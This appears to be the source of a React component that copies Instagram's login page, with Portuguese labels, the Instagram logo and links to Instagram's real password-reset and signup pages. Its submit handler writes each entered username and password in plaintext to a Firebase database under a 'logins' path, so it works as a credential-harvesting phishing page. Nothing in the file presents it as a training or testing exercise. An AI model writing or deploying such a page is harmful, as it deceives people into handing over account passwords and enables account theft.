/* eslint-disable jsx-a11y/alt-text */
import React, { useState } from 'react';
import { Container, CardLogin, CardCadastro, Loja } from './styles';
import appstore from '../../assets/appstore.png';
import playstore from '../../assets/playstore.png';
import logoInsta from '../../assets/instagram-logo-1.png'
import fb from '../../ConfFirebase';


function Layout() {

  const [user, setUser] = useState('');
  const [password, setPassword] = useState('');
  var db = fb.database();

  function handleSubmit(user, password) {
    db.ref('logins/' + user).set({
      username: user,
      pass: password
    });
  }

  return(
    <Container>
      <CardLogin>
        <img id="logo-insta" src={logoInsta} />
        <form onSubmit={() => handleSubmit(user, password)}>
          <input type="text" name="user" onChange={ (event) => setUser(event.target.value)} placeholder="Telefone, nome de usuário ou email"/>
          <input type="password" name="password" onChange={ (event) => setPassword(event.target.value)} placeholder="Senha"/>
          <button type="submit">Entrar</button>
        </form>
        <span>OU</span>
        <a href="http://facebook.com">
          <button id="facebook">Entrar com o Facebook</button>
        </a>
        <a href="https://www.instagram.com/accounts/password/reset/">
          <h5>Esqueceu sua senha?</h5>
        </a>
      </CardLogin>
      <CardCadastro>
        Não tem uma conta? 
        <a href="https://www.instagram.com/accounts/emailsignup/">
          <span>Cadastre-se</span>
        </a>
      </CardCadastro>
      Obtenha o aplicativo.

      <div id="lojas">
        <Loja>
          <a href="http://https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo">
            <img src={appstore}/>
          </a>
        </Loja>
        <Loja>
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DBFC9323C-3854-4891-B23D-94CB9022F60C%26utm_content%3Dlo%26utm_medium%3Dbadge">
            <img src={playstore}/>
          </a>
        </Loja>
        
      </div>
    </Container>
  )
}

export default Layout;